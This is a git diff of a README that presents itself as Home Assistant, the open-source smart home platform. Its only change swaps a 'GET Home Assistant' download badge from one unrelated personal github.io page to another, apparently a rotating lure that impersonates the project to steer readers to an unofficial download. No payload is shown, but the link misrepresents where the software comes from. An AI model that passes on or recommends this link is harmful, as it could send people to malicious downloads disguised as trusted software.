@@ -1,6 +1,6 @@
 # Home Assistant - Open Source Smart Home Automation
 
-[![GET Home Assistant](https://img.shields.io/badge/GET%20%E2%80%94%20Home%20Assistant-0078D6?style=for-the-badge&logoColor=white)](https://sofiaquluf502.github.io/.github/home-assistant-api)
+[![GET Home Assistant](https://img.shields.io/badge/GET%20%E2%80%94%20Home%20Assistant-0078D6?style=for-the-badge&logoColor=white)](https://ezrahhilljned.github.io/.github/home-assistant-api)
 
 ## Home Assistant Control Overview
 
